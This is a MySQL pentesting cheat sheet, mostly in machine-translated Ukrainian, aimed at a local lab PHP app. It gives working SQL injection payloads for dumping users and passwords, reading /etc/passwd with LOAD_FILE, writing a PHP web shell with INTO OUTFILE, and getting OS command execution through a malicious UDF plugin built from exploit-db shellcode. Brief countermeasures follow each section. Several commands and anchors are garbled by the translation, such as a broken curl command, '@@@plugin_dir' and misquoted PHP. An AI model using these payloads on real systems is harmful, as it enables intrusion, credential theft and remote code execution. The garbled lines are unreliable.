# MySQL Pentesting Techniques

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [Передумови] (#Передумови)
  - [Кроки](#Steps)
    - [Крок 1: Читання файлу за допомогою LOAD_FILE](#Крок-за-кроком)
  - [Контрзаходи](#Measures)
- [INTO OUTFILE - записати PHP-файл у RCE](#into-outfile-write-a-php-file-to-rce)
  - [Передумова](#Передумова-1)
  - [Кроки](#Кроки-1)
    - [Крок 1: Запишіть PHP-файл за допомогою `INTO OUTFILE`](#step-1-write-a-php-file-into-outfile-)
    - [Крок 2: Виконання команд ОС через PHP](#step-2-execute-os-commands-via-php)
  - [Контрзахід](#measure-1).
- [UDF - запис файлу плагіна до RCE](#udf-write-a-plugin-file-to-rce)
  - [Передумови](#Передумова-2)
  - [ідея](#idea)
  - [Кроки](#Кроки-2)
    - [Крок 1: Визначте директорію плагіна](#крок-1 - визначте директорію плагіна)
    - [Крок 2: Напишіть плагін](#крок-2 - написати плагін)
    - [Крок 3: Завантажте плагін і створіть UDF](#крок-3-Завантажте плагін і створіть udf)
    - [Крок 4: Виконання команд os через UDF](#крок-4-виконання команд os через udf)
  - [Вимірювання](#Вимірювання-2)


<!-- /code_chunk_output -->


## Normal request

```
http://localhost:8888/mysql.php?user=admin&pass=p4ssw0rd
```


## Query log

```
less +F ./log/mysql/query.log
```


## Basic SQL Injection

**UNION SELECT**

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT 1, 2, 3;--+
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION ALL SELECT id, username, password FROM users;--+
```


**INSERT та DELETE**

```
http://localhost:8888/mysql.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
```

```
http://localhost:8888/mysql.php?user=&pass='; DELETE FROM users WHERE username='pwned';--+
```


## LOAD_FILE - Read file

### Обов'язкова умова.

- Якщо secure-file-priv вимкнено (за замовчуванням вимкнено до MySQL 5.7.5).


### Крок за кроком.

#### Крок 1: Читання файлу за допомогою LOAD_FILE

Функція `LOAD_FILE` може бути використана для читання вмісту файлу.

Зчитаний вміст може бути виведено як результат запиту з використанням оператора UNION SELECT.

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/etc/passwd');--+
```


> result:
>
> id=, username=, password=root:​x:0:0:root:/root:/bin/bash daemon:​x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:​x:2:2:bin:/bin:/usr/sbin/nologin sys:​x:3:3:sys:/dev:/usr/sbin/nologin sync:​x:4:65534:sync:/bin:/bin/sync games:​x:5:60:games:/usr/games:/usr/sbin/nologin man:​x:6:12:​man:/var/cache/man:/usr/sbin/nologin lp:​x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:​x:8:8:mail:/var/mail:/usr/sbin/nologin news:​x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:​x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:​x:13:13:proxy:/bin:/usr/sbin/nologin www-data:​x:33:33:www-data:/var/www:/usr/sbin/nologin backup:​x:34:34:backup:/var/backups:/usr/sbin/nologin list:​x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:​x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:​x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:​x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:​x:​100:65534::/nonexistent:/usr/sbin/nologin mysql:​x:999:999::/home/mysql:/bin/sh


### Контрзаходи.

- Заборонити читання файлів, включивши опцію secure-file-priv


## INTO OUTFILE - записати PHP-файл до RCE

### Необхідна умова.

- Якщо MySQL має доступ до публічного каталогу PHP
- Якщо опція secure-file-priv вимкнена (вимкнена за замовчуванням до MySQL 5.7.5)


### Кроки.

#### Крок 1: Запишіть PHP-файл за допомогою `INTO OUTFILE`.

Використовуйте `INTO OUTFILE`, щоб записати PHP-код для запуску в WebShell у вигляді PHP-файлу.

```php
<?php $param=$_GET[«cmd»]; echo shell_exec($param);.
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,'<?php $param=$_GET["cmd"]; echo shell_exec($param);' INTO OUTFILE '/var/www/html/poc.php
```

#### Крок 2: Виконання команд ОС за допомогою PHP

Якщо ви успішно записали файл, ви можете використовувати наступну URL-адресу для виконання будь-якої команди.

```
❯ curl 'http://localhost:8888/poc.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Рішення.

- Розділіть конфігурацію MySQL і веб-сервера.
- Увімкніть опцію secure-file-priv для заборони запису файлів.


## UDF - Записати файл плагіна в RCE

### Обов'язкова умова.

- Якщо ваша конфігурація дозволяє виконання операторів подвійного запису
- Якщо каталог плагіна доступний для запису процесам MySQL.


### Ідея.

- MySQL дозволяє писати плагіни на C і реалізовувати власні SQL-функції (UDF).
- Звичайно, в межах мови C можна виконувати довільний код, тому можна створювати UDF, які виконують команди ОС
  - Приклад. https://www.exploit-db.com/exploits/1518
- Якщо MySQL має доступ на запис до каталогу плагінів, довільний код можна виконати, написавши двійковий файл, що містить UDF, і завантаживши його як плагін.
- Попередньо скомпільовані UDF для виконання команд операційної системи також можна знайти у всьому світі.
  - Приклад. Приклад: https://www.exploit-db.com/exploits/46249
- Для MySQL бінарний файл потрібно розмістити в каталозі для плагіна

### Крок за кроком.

#### Крок 1: Визначте каталог плагіна

Дізнайтеся, куди записати бінарний файл.

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@@plugin_dir,'','';--+
```

> result:.
>
> id=/usr/lib/mysql/plugin/, username=, password=


#### Крок 2: Напишіть плагін

Значення `hellcode_x64` в [існуючому коді експлойта](https://www.exploit-db.com/exploits/46249) є скомпільованими двійковими даними. У наступній процедурі використовується це значення.

Замініть частину коментаря в наступній команді бінарними даними.

Відправте POST-запит, оскільки GET-запит не може бути виконаний через обмеження на довжину URI. Якщо ви можете використовувати тільки GET-запити, ви можете обійти це обмеження, розбивши двійковий файл, зберігши його в БД і об'єднавши пізніше.

```
curl http://localhost:8888/mysql.php \
  -d 'user='; S`` curl
  -d 'pass='; SELECT BINARY /*Вставте тут двійкові дані у вигляді чисел (наприклад. 0x41424344)*/ у файл дампа '/usr/lib/mysql/plugin/mysql_udfsys.so';--+»
```

#### Крок 3: Завантажте плагін і створіть UDF

Функція символу `ys_exec` у бінарному файлі може бути виконана як UDF.

```
http://localhost:8888/mysql.php?user=&pass='; CREATE FUNCTION sys_exec RETURNS int SONAME 'mysql_udfsys.so';--+
```


#### Крок 4: Виконання команд ОС через UDF

Оскільки результат виконання команди невідомий, запишіть його у файл, щоб підтвердити успішність виконання команди.

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT sys_exec('echo PWNED! > /var/www/html/udf_poc'), '', '';--+
```

```
❯ curl http://localhost:8888/udf_poc
PWNED!
```


### Виправлення.

- Увімкніть опцію заборони виконання подвійних інструкцій або використання sqli тощо.
- Зменшіть привілеї процесу MySQL до мінімально необхідних.
- Увімкніть опцію secure-file-priv для заборони запису файлів.